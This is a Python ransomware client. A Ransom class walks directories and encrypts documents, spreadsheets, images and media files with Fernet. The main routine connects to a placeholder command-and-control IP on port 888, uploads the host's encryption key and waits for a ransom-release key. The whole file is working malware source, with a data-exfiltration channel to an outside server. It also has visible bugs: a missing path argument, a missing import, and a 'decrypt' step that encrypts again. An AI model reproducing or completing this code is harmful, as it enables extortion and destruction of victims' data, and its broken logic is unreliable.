import socket
import subprocess
import json, os, gc
from cryptography.fernet import Fernet
from hashlib import sha256
from base64 import b64encode




class Ransom(object):
    
    def __init__(self,key):
        hashOfThekey = sha256(key).digest()
        self.key = b64encode(hashOfThekey)
    
    def encrytData(self,data):
        cipherText = Fernet(self.key).encrypt(data)
        return cipherText


    def decryptData(self,data):
        cipherText = Fernet(self.key).decrypt(data)
        return cipherText
        
        
    def encryptFile(self, path):
        data = open(path,'rb').read()
        encryptedData = self.encrytData(data)
        open(path,'wb').write(encryptedData)
    
    
    def decryptFile(self, path):
        data = open(path,'rb').read()
        decData = self.decryptData(data)
        print(type(decData))
        open(path,'wb').write(decData)
        
        
    def encryptDir(self,path):
        for root,_,file in os.walk(path):
            for i in file:
                self.encryptFile(os.path.join(root,i))
                
    def decryptDir(self,path):
        for root,_,file in os.walk(path):
            for i in file:
                self.decryptFile(os.path.join(root,i))
    
    def encryptAllDocuments(self,path):
        types = ['.txt','.xlsx','.docx','.pdf','.mp3','.csv','.mp4','.png']
        for root,_,file in os.walk(path):
            for i in file:
                path = os.path.join(root,i)
                extention = os.path.splitext(path)[-1]
                if extention in types:
                    self.encryptFile(path)
                    
    
    def decryptAllDocuments(self,path):
        types = ['.txt','.xlsx','.docx','.pdf','.mp3','.csv','.mp4','.png']
        for root,_,file in os.walk(path):
            for i in file:
                path = os.path.join(root,i)
                extention = os.path.splitext(path)[-1]
                if extention in types:
                    self.decryptFile(path)
                    
                    




def sendMsg(msg,conn):
    global SHAREDKEY
    msg = Ransom(SHAREDKEY).encrytData(msg)
    buffer = int.to_bytes(len(msg),4)
    conn.send(buffer)
    conn.send(msg)
    
    
def readMsg(conn):
    global SHAREDKEY
    buffer = int.from_bytes(conn.recv(4))
    msg = conn.recv(buffer)
    msg = Ransom(SHAREDKEY).decryptData(msg)
    return msg

def cmd(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return p.stdout.read()


def main():
    global SHAREDKEY
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverIp = '<The IP of the Server>'
    port = 888
    client.connect((serverIp,port))
    key = sha256(os.urandom(22)).hexdigest()
    host = cmd('hostname').decode().strip()
    path = 'C:\\TEMP\\test'
    info = {host:key}
    gc.collect()
    Ransom(key.encode()).encryptAllDocuments()
    sendMsg(json.dumps(info).encode(),client)
    del info
    del key
    while True:
        msg = readMsg(client)
        if msg.startswith(b'Decyption Key = '):
            print(msg)
            decrypt_Key = msg[16:]
            Ransom(decrypt_Key).encryptAllDocuments(path)
            return
        time.sleep(5)
        
        
if __name__ == '__main__':
    SHAREDKEY = b"643bf8a247f67ef78d2902b0fe77f36c8ffbb22f5c5c92378c6784b9a30c38ab"
    main()
    
    
